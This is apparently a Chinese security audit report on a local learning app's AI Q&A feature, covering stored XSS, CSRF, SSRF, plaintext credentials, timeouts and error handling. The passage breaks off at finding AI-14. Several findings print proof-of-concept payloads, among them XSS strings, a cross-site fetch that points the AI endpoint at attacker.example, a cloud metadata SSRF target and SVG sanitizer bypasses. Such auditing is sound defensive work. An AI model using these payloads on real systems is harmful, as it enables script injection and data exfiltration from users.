# 08 · AI 问答功能与外部服务集成审查

- 审查对象：`F:\AI\大观园本地`（分支 `main`，HEAD `126266d`，package version v1.0.10）
- 审查范围：`local-server/ai-service.mjs`、`local-server/cxyonly-client.mjs`、`local-server/server.mjs` AI 路由、`web/ai-settings.js`、`web/ai-panel-layout.js`、`web/ai-reading.js`、`web/ai-services.css`、AI 相关渲染路径、`desktop/policy.mjs` / `desktop/preload.cjs` / `desktop/electron-main.cjs`
- 审查方式：只读代码审查 + 临时数据目录起本地服务实测 + 本地假上游（fake upstream）行为探针 + 真实 `node --test`
- 时间：2026-10-01
- 未做：任何真实第三方 AI / 官网付费或写入调用；未读取真实 `%LOCALAPPDATA%\DaguanMath\data`；未读取真实 `cxyonly-integration.json`

---

## 0) 结论摘要

AI 功能的**服务端契约设计整体是清醒的**：Key 不回传前端（只给 `keyHint`）、思考内容（`think`/`reasoning_content`）有跨分块过滤、baseUrl 有协议与私网策略、请求有 90s 兜底、失败不写历史。这些在 `test/ai-service.test.mjs` 里都有真实用例覆盖。

但**两处结构性缺口把上面这些防护的价值削掉大半**：

1. **新界面（`web/app-new.js`）的 AI 渲染路径完全没有 HTML 清洗**，而旧界面（`web/app-legacy.js:4712`、`web/app2.js:4390`）有 `sanitizeAiHtml`。模型返回的任意 HTML 会经 `marked.parse` → `innerHTML` 直通，并**随 `ai-history/*.json` 持久化，每次打开 AI 面板重放**（stored XSS）。桌面版 CSP 含 `'unsafe-inline'`，挡不住 `onerror` 型载荷；浏览器版根本没有 CSP。
2. **`/api/ai/*` 全部没有 Origin/CSRF 校验**，`Content-Type: text/plain` 的简单请求可绕过预检。实测任意网页都能向本地服务写入 AI 档案（把 baseUrl 指向攻击者端点），之后用户每次提问，题干/标准答案/官方解析都会流向该端点。

这两条叠加后，攻击链完整：跨站写入恶意档案 → 用户提问 → 题目与解析外流；若再配合 `validateBaseUrl` 允许 `169.254.169.254`，同一入口可变成对链路本地/环回地址的 SSRF。

其余为可靠性、成本与体验问题：`cxyonly-client.mjs` 全部 fetch 无超时（实测挂起 12s 仍在 pending），`streamChat` 的 90s 是**总超时而非空闲超时**（长回答会被腰斩且不落盘），上下文按轮重复整题导致 payload 近似线性翻倍，用户题目内容发往第三方 AI 全程无告知无开关。

| 严重度 | 数量 | 编号 |
| --- | --- | --- |
| P0 | 2 | AI-01、AI-02 |
| P1 | 4 | AI-03、AI-04、AI-05、AI-06 |
| P2 | 4 | AI-07、AI-08、AI-09、AI-10 |
| P3 | 4 | AI-11、AI-12、AI-13、AI-14 |

---

## 1) 发现清单

### AI-01 · P0 · 新界面 AI 输出无 HTML 清洗，构成 stored XSS（旧界面有此防护）

**证据**

`web/app-new.js:1413-1483` `renderMarkdown`，最终把 `marked` 的输出直接写进 `innerHTML`：

```js
// web/app-new.js:1444-1446
const html = marked.parse(src, { breaks: true });
...
// web/app-new.js:1467
div.innerHTML = html;
...
// web/app-new.js:1482
return div.innerHTML;
```

调用点有三处，其中两处是持久化回放：

```js
// web/app-new.js:5983（本轮回答结束时）
responseEl.innerHTML = renderMarkdown(answer);
// web/app-new.js:2652（历史消息重放）
msg.innerHTML = `<div class="ai-message-bubble">${message.role === 'user' ? escapeHtml(message.content) : renderMarkdown(message.content)}</div>`;
```

`web/app-new.js:2638-2658` 的 `renderAIHistory` 在打开 AI 面板时被调用（`web/app-new.js:2635`），历史来自 `AIService.loadHistory(question)` → `ai-history/*.json`。

而旧界面与 `app2.js` 有专门的清洗函数：

```js
// web/app-legacy.js:4712-4723（app2.js:4390 为同一实现）
function sanitizeAiHtml(html) {
  const wrap = document.createElement("div");
  wrap.innerHTML = html;
  wrap.querySelectorAll("script,iframe,object,embed,style,link,form,input,button,textarea,select").forEach((el) => el.remove());
  wrap.querySelectorAll("*").forEach((el) => {
    [...el.attributes].forEach((attr) => {
      if (/^on/i.test(attr.name) || ["href", "src", "xlink:href"].includes(attr.name) && /^(javascript:|data:text\/html|vbscript:)/i.test(attr.value)) el.removeAttribute(attr.name);
    });
  });
  wrap.querySelectorAll("img").forEach((img) => { img.removeAttribute("srcset"); img.loading = "lazy"; img.alt = img.alt || "AI生成图形"; });
  return wrap.innerHTML;
}
```

应用位置：`web/app-legacy.js:4739`（diagram SVG）、`web/app-legacy.js:4750`（消息体）、`web/app-legacy.js:5053`（流式刷新）；`web/app2.js:4417/4428/4727` 同。

对 `web/app-new.js` 全文件检索清洗相关标识：

```
Select-String -Path web\app-new.js -Pattern 'sanitize|DOMPurify|purify'
（0 命中）
```

`marked` 本身不开清洗，实测（`web/vendor/marked.min.js` 以 `new Function` 加载后逐例输入）：

```
<img src=x onerror="alert(1)">        -> 原样输出（onerror 存活）
<script>alert(1)</script>             -> 原样输出
[click](javascript:alert(1))          -> <p><a href="javascript:alert(1)">click</a></p>
<svg onload="alert(1)"></svg>         -> <p><svg onload="alert(1)"></svg></p>
<iframe src="https://evil.example"></iframe> -> 原样输出
公式 $a^2$ 然后 <b onclick="alert(1)">x</b>  -> onclick 存活
```

CSP 挡不住这条路径：

```js
// desktop/policy.mjs:5-18（节选）
script-src 'self' 'unsafe-inline';
```

`'unsafe-inline'` 允许内联事件处理器，`onerror=` / `onclick=` 型载荷不被拦截；且 `desktop/electron-main.cjs:148` 只对 `.html` 响应注入 CSP，而 `local-server/server.mjs:634-637` 对 HTML 只设 `Content-Type`/`Cache-Control`——**浏览器版完全没有 CSP**。

**影响**

模型输出（可被提示注入、被恶意/被劫持的上游 AI 服务、或 AI-02 场景下被攻击者选定的端点控制）中的 HTML 会以页面权限执行。因为 AI 历史明文落盘并在每次打开面板时重放，一次污染即长期驻留（stored XSS）。桌面版渲染进程虽为 `nodeIntegration:false / contextIsolation:true / sandbox:true`（`desktop/policy.mjs:56-64`），但 XSS 落在受信 origin 内，可调用 `desktop/electron-main.cjs:162` `validIpc` 放行的 IPC（`daguan:window`、`daguan:remote`、`daguan:update:*` 白名单动作），并可读取当前题目、本地记录、发起同源请求。

**复现**

1. 在 AI 服务档案中配置任意 OpenAI 兼容端点，让模型（或直接改 `ai-history/*.json` 里的 `assistant` 内容）返回 `<img src=x onerror="alert(document.domain)">`。
2. 打开 AI 面板：本轮结束走 `web/app-new.js:5983`；重新打开题目/面板走 `web/app-new.js:2652`，两次都会执行。
3. 离线等价验证：`node` 加载 `web/vendor/marked.min.js` 后对上述载荷调用 `marked.parse`，输出原样保留（见上）。

**修复建议**

- 在 `web/app-new.js` 内复用旧界面的清洗策略（把 `sanitizeAiHtml` 提到共享模块，`renderMarkdown` 返回前套用），或引入 DOMPurify。
- 更稳妥：`marked` 输出先经 `DOMParser` 白名单重建，只保留 `p/br/strong/em/code/pre/blockquote/ul/ol/li/table/thead/tbody/tr/th/td/h1-h6/a/img/span(仅 katex)`；`a` 只允许 `https?:` 且加 `rel="noopener noreferrer"`。
- 去掉 `script-src 'unsafe-inline'`（改为 nonce 或 hash），并给浏览器版补上同等 CSP。
- 历史读取时做一次清洗再入库，避免"写入时干净、读取时脏"的路径绕过。

**验证方式**

新增用例：向 `ai-history` 写入含 `onerror`/`javascript:`/`<iframe>` 的 assistant 内容，断言渲染后的 DOM 中不存在 `on*` 属性、`script`/`iframe` 节点、`javascript:` 协议。当前 `test/ai-service.test.mjs` 只断言**服务端 SSE 不含 think/PRIVATE**，不覆盖前端渲染。

---

### AI-02 · P0 · `/api/ai/*` 无 Origin 校验，任意网页可跨站写入 AI 档案（CSRF）

**证据**

全站只有 `/api/runtime/stop` 做了来源校验：

```js
// local-server/server.mjs:359-363（节选）
// /api/runtime/stop 校验 Origin 与 remoteAddress
```

`/api/ai/*` 的路由块 `local-server/server.mjs:533-562` 没有任何 Origin/Referer 判断，也没有 CORS 头与 `OPTIONS` 处理（`OPTIONS /api/ai/profiles` 实测返回 `HTTP 404 {"error":"资源不存在"}`）。

请求体解析不看 `Content-Type`：

```js
// local-server/server.mjs:99-109（body()）——直接 JSON.parse，不校验 Content-Type
```

实测（服务以 `DAGUAN_DATA_DIR=%TEMP%\dg-audit-08`、`PORT=18086` 启动）：

```
POST /api/ai/profiles
Content-Type: text/plain
Origin: https://evil.example
body: {"name":"csrf-probe","baseUrl":"http://127.0.0.1:9/v1","model":"m1","key":"sk-csrf-probe-key"}

-> HTTP 200
{"ok":true,"profile":{"id":"7e2be830-91b9-4b84-9129-91c61991dfa5","name":"csrf-probe",
 "baseUrl":"http://127.0.0.1:9/v1","model":"m1","streaming":true,"active":true,"keyHint":"sk-••••key",...}}
```

`text/plain` 属于 CORS 简单请求，浏览器不会预检，攻击者页面用 `fetch(..., {mode:'no-cors'})` 或表单即可发出。随后 `GET /api/ai/profiles` 能读回该档案（只返回 `keyHint`，**未泄露明文 Key**）。

**影响**

任意用户访问的网页（含广告、被挂马的页面、被引用的第三方脚本）可对本地服务：

- `POST /api/ai/profiles` 写入/改写档案，把 `baseUrl` 指向攻击者的 HTTPS 端点并设为 `active` → 用户后续每次提问，`contextText` 拼接的**题干、选项、用户作答、标准答案、官方解析**全部外流到攻击者服务器；
- `PATCH` 切换 `streaming`、`DELETE` 删除档案（带 `{clearHistory:false}` 时保留历史，带 `true` 时清空历史）；
- `POST /api/ai/chat` 直接触发一次请求，消耗用户配额。

由于本地服务只监听 `127.0.0.1`（`local-server/server.mjs:20` `HOST = "127.0.0.1"`，`:688` `server.listen(PORT, HOST)`，实测 `Get-NetTCPConnection -LocalPort 18086` → `LocalAddress 127.0.0.1`），风险来自浏览器而非局域网。

**复现**

见上方实测请求（已实际执行并取得 HTTP 200）。也可在任意网页控制台执行：

```js
fetch('http://127.0.0.1:8080/api/ai/profiles', {
  method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'text/plain'},
  body: JSON.stringify({name:'x', baseUrl:'https://attacker.example/v1', model:'m', key:'k', active:true})
});
```

**修复建议**

- 所有 `/api/ai/*`（以及其余写接口）统一校验 `Origin`/`Referer` 必须为空（同源 fetch 在部分场景不带）或等于本地来源；更稳的做法是要求一个**启动时随机生成、注入页面**的 `X-Daguan-Token` 头（简单请求无法自定义头，因此天然阻断 CSRF）。
- 强制 `Content-Type: application/json`，非该类型直接 415。
- 对 `/api/ai/profiles` 的写入增加显式确认（前端二次确认 + 服务端仅允许已确认的 baseUrl 变更）。
- 处理 `OPTIONS` 并显式不返回任何 `Access-Control-Allow-Origin`。

**验证方式**

`test/service-instance.test.mjs`、`test/electron-security.test.mjs` 均未覆盖跨站写入；建议新增"带外部 Origin 的简单请求必须被拒"的用例。

---

### AI-03 · P1 · `validateBaseUrl` 放行链路本地与环回地址（SSRF）

**证据**

```js
// local-server/ai-service.mjs:25-33
// isPrivateAddress 覆盖 10/127/0/169.254/172.16-31/192.168 与 ::1/fc/fd/fe80
// local-server/ai-service.mjs:35-54
// 字面私网 IP 与 localhost/.local 直接判为 privateNetwork 并放行（允许 http）
// DNS 失败时：http 拒绝、https 放行
```

实测（直接调用导出的 `validateBaseUrl`）：

```
ALLOW  http://169.254.169.254/latest/meta-data/ -> http://169.254.169.254/latest/meta-data
ALLOW  http://169.254.169.254/computeMetadata/v1/ -> http://169.254.169.254/computeMetadata/v1
ALLOW  http://127.0.0.1:18086/ -> http://127.0.0.1:18086
ALLOW  http://localhost:9/v1 -> http://localhost:9/v1
ALLOW  http://10.0.0.5/v1 -> http://10.0.0.5/v1
ALLOW  http://192.168.1.1/v1 -> http://192.168.1.1/v1
ALLOW  https://example.com/v1 -> https://example.com/v1
REJECT http://example.com/v1 -> 公网 AI 接口必须使用 HTTPS；本机或局域网服务可以使用 HTTP
REJECT http://user:pw@example.com/v1 -> API 地址不能内嵌账号或密码
REJECT http://[::ffff:169.254.169.254]/v1 -> 公网 AI 接口必须使用 HTTPS；本机或局域网服务可以使用 HTTP
```

`169.254.0.0/16` 是链路本地地址，包含云厂商元数据端点 `169.254.169.254`（AWS/GCP/Azure 元数据、部分环境可读实例凭据）。该策略本意是"允许用户连本机/局域网 LLM"，但把元数据地址一并放行了。

另外 `validateBaseUrl` 在 `getProfile()`（`local-server/ai-service.mjs:234-240`）里每次调用都会重跑，但**校验与实际 fetch 之间存在 DNS 重绑定窗口**（校验时解析一次，`fetch` 时再解析一次），无二次 IP 校验。

**影响**

- 单独看：用户自己把 baseUrl 填成 `http://169.254.169.254/...`，服务端会替其请求元数据端点，并把响应体当作"AI 回答"回显（`streamChat` 的非 SSE 兜底会尝试 `JSON.parse(await upstream.text())`）。在云主机/容器环境可能读到实例元数据。
- 与 AI-02 组合：攻击者页面无需用户操作即可写入该 baseUrl，构成完整的跨站 SSRF。
- `http://127.0.0.1:18086/`（自身 API）也被放行，可形成自请求环路。

**复现**

`node` 调用 `validateBaseUrl('http://169.254.169.254/latest/meta-data/')` → 返回该 URL（未抛错），见上表。**未做真实元数据请求**（只读探测，避免触达外部服务）。

**修复建议**

- 在私网判定中显式排除 `169.254.0.0/16`、`0.0.0.0/8`、`100.64.0.0/10`（CGNAT）、IPv6 `::ffff:` 映射形式；仅保留用户可预期的 `127.0.0.0/8`、`10/8`、`172.16/12`、`192.168/16`、`::1`、`fc00::/7`。
- 用自定义 `lookup`（`undici` 的 `Agent` + `connect.lookup`）把**解析与连接绑成一次**，在 connect 阶段再校验一次目标 IP，消除重绑定窗口。
- 对 loopback 增加例外说明：如确实要允许自请求，至少禁止指向本服务自身端口。

**验证方式**

新增用例断言 `169.254.169.254`、`0.0.0.0`、`[::ffff:169.254.169.254]` 均被拒。当前 `test/ai-service.test.mjs:9-13` 只覆盖"拒内嵌凭据、拒公网 http、放行 `http://127.0.0.1:1234/v1`"。

---

### AI-04 · P1 · 凭据明文落盘，Windows 上权限收紧完全失效

**证据**

```js
// local-server/store.mjs:28-34
await fs.writeFile(temp, JSON.stringify(value, null, 2) + "\n", { mode });
...
if (process.platform !== "win32") await fs.chmod(file, mode);
// local-server/store.mjs:19-21
// ensure() 同样只在非 win32 时 chmod dataDir 0o700
```

落盘实测（`%TEMP%\dg-audit-08\ai-profiles.json`）：

```
"key": "sk-csrf-probe-key"        ← 明文
```

目录 ACL（`(Get-Acl $dir).Access`）：

```
LAPTOP-4HH5HER9\CodexSandboxUsers  Modify
LAPTOP-4HH5HER9\14666              FullControl
NT AUTHORITY\SYSTEM                FullControl
BUILTIN\Administrators             FullControl
```

即无应用层收紧，完全依赖目录继承 ACL。同类文件还包括 `cxyonly-integration.json`（`local-server/store.mjs:10`，`login()` 里 `writeIntegration({..., token, ...})` 明文写 token，`local-server/cxyonly-client.mjs:114-124`）与 `ai-history/*.json`（`local-server/store.mjs:13`，内含完整题干/标准答案/官方解析）。

**未发现**的问题（已核查，可作为"没有更糟"的记录）：

- Key 不出现在任何 `console.*`：`local-server/ai-service.mjs`、`local-server/cxyonly-client.mjs` 中 `console.` 命中数为 0；`local-server/server.mjs` 仅两条启动日志（`:657`、`:694`）。
- Key 不回传前端：`publicProfile`（`local-server/ai-service.mjs:124-137`）只给 `keyHint = ${key.slice(0,3)}••••${key.slice(-3)}`；实测 `GET /api/ai/profiles` 响应无 `key` 字段；`cxyonly-client.status()`（`:130-139`）经 `redactSecrets()` 过滤。
- `redactSecrets()`（`local-server/cxyonly-client.mjs:13-19`）按 `/(token|password|passwd|secret|authorization|cookie)/i` 过滤字段名后才落盘 profile。
- `/export` 端点（`local-server/server.mjs:583-591`）只回文档，不含 token。
- 无遥测/上报代码路径。

**影响**

同一台机器上的其他本地用户/进程可读取 AI Key（含可计费凭据）与官网 token；`ai-history/*.json` 泄露学生学习记录与题目上下文。若数据目录被同步盘/备份工具纳入（`%LOCALAPPDATA%` 常被 OneDrive 之外的备份软件扫描），明文凭据会随之外发。

**修复建议**

- 用 Electron `safeStorage`（DPAPI）加密 Key 后再落盘，或改为仅内存保存 + 启动时让用户重新输入。
- Windows 上不要依赖 `mode`：用 `fs.chmod` 等价物不可用时，显式设置 DACL（只保留当前用户 + SYSTEM），或至少把数据目录建在 `%LOCALAPPDATA%` 下并收紧继承。
- 给 `ai-history` 增加"不保存完整题目上下文"的选项，或对历史中的敏感字段做脱敏。

**验证方式**

在临时目录写入档案后检查文件内容与 `Get-Acl`；断言 `ai-profiles.json` 中不存在 `"key"` 明文字段。

---

### AI-05 · P1 · `cxyonly-client` 全链路无超时，同步可长时间卡死

**证据**

```js
// local-server/cxyonly-client.mjs:36-68  request()
await this.fetchImpl(this.apiUrl(pathname), { ...options, headers });   // 无 AbortSignal / 无超时
// :70-82  refreshCsrf()、:84-128 login() 同样无超时
// :141-162 fetchStates()：for (let page = 1; page <= 200; page++)  最多 200 页 × 200 条，串行，每页无超时
// :217-232 patchState()：最多 3 次尝试，退避 attempt*600ms，仅对 429 与 ≥500 重试
```

`local-server/server.mjs:217-239` `applyPush()` 用 `Promise.all([worker(), worker(), worker()])` 三并发，操作数无上限，每个操作最多 3 次尝试且可能叠加 `refreshCsrf`。

实测（真实 `CxyonlyClient` 指向本地假上游）：

```
A) 上游挂起不响应：STILL PENDING after 12s (elapsed 12015ms, server hits=1)
   → 客户端层完全没有超时，只能等 undici 默认（约 300s）
B) PATCH 遇 500：threw: /api/questions/q1/state: boom status=500 (hits=6, elapsed 1856ms)
   → 3 次重试 × 每次失败后 csrfToken 仍为空又重取一次 CSRF，共 6 次请求
C) PATCH 遇 401：threw: ... status=401 code=AUTH_EXPIRED (hits=2) → 不重试（正确）
D) 403 且文案含 CSRF：ok (hits=2) → 刷新 CSRF 后重放一次成功（正确）
```

**影响**

同步/拉取期间上游慢或不可达，服务端会长时间挂住；`fetchStates()` 最坏情况 200 次串行无超时请求；`applyPush` 三并发叠加可放大为数十个悬挂连接。前端同步界面会一直转圈，用户只能杀进程，而进程被杀时可能留下不一致状态。

**修复建议**

- 给 `request()` 加 `AbortSignal.timeout(15_000)`（拉取可放宽到 30s），并把超时错误归一成 `code:"NETWORK_TIMEOUT"`。
- `fetchStates()` 增加总时长上限与页数上限（例如最多 20 页 + 60s 总预算），并支持传入外部 signal。
- `applyPush` 的重试退避加抖动，并把并发降到可配置（默认 2），对同一题目 ID 去重。
- 服务端为同步操作加"取消"入口（现在只有 AI 有 `stop`）。

**验证方式**

新增用例：假上游永不响应，断言 15s 内抛超时错误；断言 `fetchStates` 在给定总预算内放弃。

---

### AI-06 · P1 · `streamChat` 的 90s 是总超时而非空闲超时，长回答被腰斩且不落盘

**证据**

```js
// local-server/ai-service.mjs:344
setTimeout(() => controller.abort(new Error("AI 请求超时")), REQUEST_TIMEOUT_MS);   // REQUEST_TIMEOUT_MS = 90_000 (:11)
```

该定时器从请求开始计时，**不随数据到达而重置**。流式长回答（数学题详细推导 + 公式）很容易超过 90s，此时：

```js
// local-server/ai-service.mjs:398-401
if (controller.signal.aborted) throw controller.signal.reason;
// 历史写入在正常路径才执行
```

```js
// local-server/ai-service.mjs:403-410
// catch: writeSse({type:"error", ...})；finally: 清 timer、runs.delete、res.end
// 失败/中止不写历史
```

前端此时已经显示部分内容（`web/app-new.js:5963` 流式 `textContent`），但历史里没有这条回答；用户重开题目就看不到刚才的半截答案。

**影响**

长回答被截断且丢失；用户看到"AI 请求已停止"或半截答案，无"继续/重试"上下文保留。同时因为超时后 `runs.delete` 才发生，90s 内该 run 一直占用并发额度（上限 2）。

**修复建议**

- 改为**空闲超时**：每次收到 chunk 就 `timer.refresh()`；另加一个更宽松的墙钟上限（如 5 分钟）。
- 被中止时把已生成的部分答案写入历史并打标记（例如 `interrupted: true`），前端展示"（已中断，可继续）"。
- 前端在超时/错误后提供"从断点继续"按钮（把已有部分作为 assistant 前缀）。

**验证方式**

新增用例：假上游先发若干 delta 后保持连接 100s，断言客户端在空闲超时前不中断；以及"中止后历史含部分答案"。

---

### AI-07 · P2 · 上下文按轮重复整题，token 消耗近似二次增长

**证据**

```js
// local-server/ai-service.mjs:307-322  contextText()
// 每轮都拼：题号、知识路径、来源、题型、题干 safeText(q.stem)（≤120,000 字符）、
// 选项、用户作答、标准答案 safeText(q.answer)（120k）、官方解析 safeText(q.explanation)（120k）
// 仅 includePrivate === true 才追加批注(20k)/掌握/易错/收藏
// local-server/ai-service.mjs:330-332
const historyMessages = ...slice(-24);
const prompt = safeText(payload.prompt, 20_000);
const userMessage = contextText(...) + "\n\n本次请求：" + prompt;
```

历史里保存的正是 `userMessage`（含完整上下文），而每轮又把历史整体回传（`local-server/ai-service.mjs:400-401` 写历史、`:330` 回传最近 24 条）。实测：

```
ctx-probe（10 万字符题干）：
  turn 1: messages=2 totalChars=135445
  turn 2: messages=4 totalChars=270526
ctx-probe2：
  turn 1: messages=2 totalChars=100453
  turn 2: messages=4 totalChars=200544
  ai-history 落盘文件 bytes=601019 messages=4 userChars=100083/4/100083/4
  contains full stem? true | contains 标准答案? true | contains 官方解析? true
```

即第 N 轮的 payload 约为第 1 轮的 N 倍，24 轮上限下最坏约 24×135K ≈ 3.2M 字符/次请求。没有 token 计数、没有裁剪、没有对相同题目的上下文缓存、没有重复请求去重。

**影响**

费用与延迟随对话轮数线性上升；大题干（题库里长解析题）会迅速触达模型上下文上限导致上游 400，用户只看到笼统错误。

**修复建议**

- 历史只保留**对话本身**（用户提问 + 回答），题干上下文只在**首轮**或题目变化时注入，后续轮引用"同一题"。
- 加粗粒度 token 估算（字符数/2.5 对中文的保守估计），超出预算时先丢历史再截解析。
- 对同一 `questionId` + 同一 profile 的上下文做内存缓存，命中即复用。
- 前端对连续快速点击做去重（当前靠服务端 `runs.size >= 2` 兜底，见 AI-10）。

**验证方式**

新增用例：固定题干跑 3 轮，断言第 3 轮 payload 字符数不超过第 1 轮的 1.5 倍。

---

### AI-08 · P2 · 题目内容发往第三方 AI，全程无告知、无开关

**证据**

`contextText()`（`local-server/ai-service.mjs:307-322`）默认（`includePrivate !== true`）就会把**题干、选项、用户作答、标准答案、官方解析**发往 `profile.baseUrl`。前端 UI 文案只有：

```js
// web/ai-settings.js:16
"支持 OpenAI 兼容接口。Key 只保存在本地服务中。"
```

全站隐私相关文案检索只找到"上传到官网"的同步确认（`web/app-new.js:5242`、`web/app-legacy.js:4120/4133/5556`、`web/app2.js:3809/3822/5307`），**没有任何"题目内容会发送给第三方 AI 服务"的提示或开关**；`includePrivate` 只控制批注/掌握/易错/收藏。

**影响**

用户以为 AI 是本地功能，实际每次提问都把题目与解析交给第三方端点（用户自填的 baseUrl，可能是任何厂商）。与 AI-02 组合后，用户对"数据去了哪"完全没有知情与选择。

**修复建议**

- 首次使用 AI 前弹一次明确告知（"题干、标准答案、解析将发送到 <baseUrl 域名>"），并记录已确认。
- 提供"仅发送题干，不含答案与解析"的开关（很多场景足够，也顺带省钱）。
- 在 AI 面板常驻显示当前档案的域名。

**验证方式**

检查首次打开 AI 面板是否出现告知；断言默认不发送 `q.answer`/`q.explanation`（需产品决策）。

---

### AI-09 · P2 · 错误语义：HTTP 200 先于上游连接；所有失败都是 500 且原文透出

**证据**

```js
// local-server/ai-service.mjs:346-347
res.writeHead(200, { "Content-Type": "text/event-stream", ..., "X-Daguan-Run-Id": runId });
writeSse({ type: "started" });        // 先 200，再连上游
```

```js
// local-server/server.mjs:644-645
route(req, res).catch((e) => errorJson(res, e));     // 未捕获异常统一 500
// local-server/server.mjs:51-54  errorJson 默认 status = 500
```

实测：

```
POST /api/ai/chat  body 非法 JSON            -> HTTP 500 {"ok":false,"code":null,"error":"JSON 格式错误"}
POST /api/ai/chat  不存在的 profileId         -> HTTP 500 {"ok":false,"code":null,"error":"AI 服务档案不存在"}
GET  /api/ai/profiles/nope/models            -> HTTP 500 {"ok":false,"code":null,"error":"AI 服务档案不存在"}
POST /api/ai/chat  不可达上游 127.0.0.1:9     -> HTTP 200 SSE: {"type":"started",...} 然后 {"type":"error",...,"error":"fetch failed"}
POST /api/ai/chat  畸形 question（字符串）    -> HTTP 200 SSE，同样 "fetch failed"
11MB 请求体                                   -> HTTP 500 {"ok":false,"code":null,"error":"请求体过大"}
```

上游错误原文直接透给用户（`local-server/ai-service.mjs:403-404` 把 `error.message` 截 500 字符写入 SSE `error` 事件），前端再原样展示：

```js
// web/app-new.js:5996
`<div class="ai-error"><div>AI 暂时没有完成回答：${escapeHtml(error.message || String(error))}</div><button ...>重试</button></div>`
```

**影响**

- "档案不存在""JSON 格式错误"这类客户端错误返回 500，语义错误（监控、重试策略、日志分级都会被误导）。
- 用户看到"fetch failed"这类无意义文案，无法区分"没网""地址填错""Key 无效""上游宕机""配额耗尽"。
- 200 先行的 SSE 设计本身是合理的（流式必须早写头），但意味着**所有失败都只能靠事件表达**，前端必须完整处理 `error` 事件（当前确实处理了，但文案未分类）。

**修复建议**

- 服务端在 `writeHead` 之前完成所有可预判校验（profile 存在、model 存在、baseUrl 合法），失败按 400/404/409/429 返回。
- 把上游错误归一为枚举：`NETWORK_UNREACHABLE` / `UPSTREAM_401` / `UPSTREAM_429` / `UPSTREAM_5XX` / `MALFORMED_RESPONSE`，并给用户中文可行动文案（"Key 无效，请到 AI 设置检查"）。
- 5xx 上暴露上游原文时只保留状态码与分类，避免把内部细节（含可能的 URL/凭据片段）透给前端。

**验证方式**

断言不存在档案时返回 404 而非 500；断言 SSE `error` 事件的 `error` 字段为枚举值。

---

### AI-10 · P2 · 并发上限用 500 表达，不是 429

**证据**

```js
// local-server/ai-service.mjs:325
if (runs.size >= 2) throw new Error("当前已有两个 AI 任务在生成，请稍后再试");
```

该抛错发生在 `writeHead` 之前，因此经 `local-server/server.mjs:644-645` 变成 HTTP 500。

**影响**

用户连续点击或前端未禁用按钮时会看到"服务器错误"而非"请稍候"；也影响任何按状态码做重试/退避的客户端逻辑。

**修复建议**

给错误加 `status = 429`（`errorJson` 已经支持 `Number(error?.status)`，见 `local-server/server.mjs:52`），前端据此显示排队提示并禁用发送按钮。

**验证方式**

并发发起 3 个 chat，断言第 3 个返回 429。

---

### AI-11 · P3 · `sanitizeSvgMarkup` 正则黑名单可被绕过（当前新界面未使用该端点，属潜在风险）

**证据**

```js
// local-server/ai-service.mjs:198-204
// 正则删成对 <script>...</script>、<foreignObject>...</foreignObject>、
// \s(?:on[a-z]+|href|xlink:href)\s*=\s*("..."|'...') 中值可疑的属性、<iframe|object|embed|style|link> 标签
```

逐例实测（复刻同源正则）：

```
stripped | <svg onload="alert(1)"><rect/></svg>
SURVIVES | <svg><rect/onload="alert(1)"/></svg>              ← 属性名前无空白字符
SURVIVES | <svg><script src="//evil.example/x.js"/></svg>     ← 无闭合标签，成对删除失效
SURVIVES | <svg><animate attributeName="href" values="javascript:alert(1)"/></svg>
stripped | <script>alert(1)</script>
stripped | <a xlink:href="javascript:...">
stripped | <image href="https://evil.example/p.png"/>
stripped | <use href="//evil.example/x.svg#a"/>
stripped | <foreignObject><img src=x onerror=alert(1)></foreignObject>
```

当前**新界面不引用该端点**（`Select-String web\*.js -Pattern 'ai/diagram'` 只命中 `web/app-legacy.js:4726/4735` 与 `web/app2.js:4404/4413`），而旧界面在写入 DOM 前还会再套一层 `sanitizeAiHtml`（`web/app-legacy.js:4739`），因此现阶段不可直接利用。风险在于：该函数是"深度防御"的最后一层，一旦新界面接入 diagram、或有人移除前端那层清洗，绕过即成立。

`pythonSvg`（`local-server/ai-service.mjs:206-220`）本身设计良好：spec 走 stdin JSON（不是 argv，无命令注入）、10s 超时 kill、stdout 5MB 上限；`scripts/render_math_diagram.py` 只接受白名单 AST 表达式（`:20-34`），`eval` 在 `{"__builtins__": {}}` 下执行（`:53`），不接受模型/浏览器提供的 Python 代码。

**修复建议**

- 不要用正则做 SVG 清洗：解析为 DOM（服务端可用轻量 XML 解析器）后走标签/属性白名单，只保留 `svg/g/path/rect/line/circle/ellipse/polyline/polygon/text/tspan/title/defs` 与 `d/points/x/y/width/height/fill/stroke/stroke-width/transform/viewBox` 等展示属性。
- 前端对 `result.svg` 继续保留 `sanitizeAiHtml`（不要因为服务端"已清洗"而移除）。

**验证方式**

把上述 3 条 SURVIVES 用例写进测试，断言输出不含 `on*`、`<script`、`javascript:`。

---

### AI-12 · P3 · `createAnswerFilter` 遇未闭合 `<` 会把可见尾部冻结到流结束

**证据**

```js
// local-server/ai-service.mjs:61-95（跨分块缓存未闭合标签、depth 计数）
if (end < 0) break;      // 未闭合的 "<" → 余下文本全部挂起，直到 final 才吐
```

`test/ai-service.test.mjs:59-69` 已覆盖"未闭合"场景（保证正确性），但代价是：模型输出中出现 `a < b` 之类的裸 `<` 且后续没有 `>` 时，用户会看到回答长时间"停住"，直到流结束才一次性出现。

**影响**

纯体验问题：流式感消失，用户可能以为卡死而手动停止。

**修复建议**

未闭合 `<` 缓存超过一定长度（如 200 字符）或超过一定时间（如 500ms）就当作普通文本吐出，仅在确认是标签前缀时才继续缓存。

**验证方式**

新增用例：输入 `a < b` 后跟 1000 字普通文本，断言输出不会一直为空。

---

### AI-13 · P3 · 视觉输入 4 张图片可能直接触达 10MB 请求体上限

**证据**

```js
// web/app-new.js:3475-3491  questionImages()：过滤 blob > 2MB、最多 4 张 dataURL
// local-server/ai-service.mjs:338-339
payload.images.slice(0, 4).map((url) => ({ type: "image_url", url: safeText(url, 2_000_000) }))
// local-server/server.mjs:23  MAX_BODY = 10MB
```

4 张 2MB 图片经 base64 膨胀约 1.37 倍 ≈ 10.7MB，**超过 10MB 上限** → 服务端在 `body()` 阶段即抛 `请求体过大`，返回 500。前端过滤只按原始 blob 大小，未考虑 base64 膨胀。

**影响**

用户按要求上传 4 张较大截图时会得到"请求体过大"的 500，且文案不指向图片。

**修复建议**

前端把上限改为"原始字节总和 ≤ 6MB"（或按 base64 后大小计算），并在超限时明确提示"图片过大，请减少数量或压缩"；服务端把该错误码设为 413。

**验证方式**

构造 4×2MB 图片载荷，断言前端在发送前就拒绝并给出可读提示。

---

### AI-14 · P3 · AI 相关测试覆盖真实缺口，UI 用例在本环境全部 skip

**证据**

```
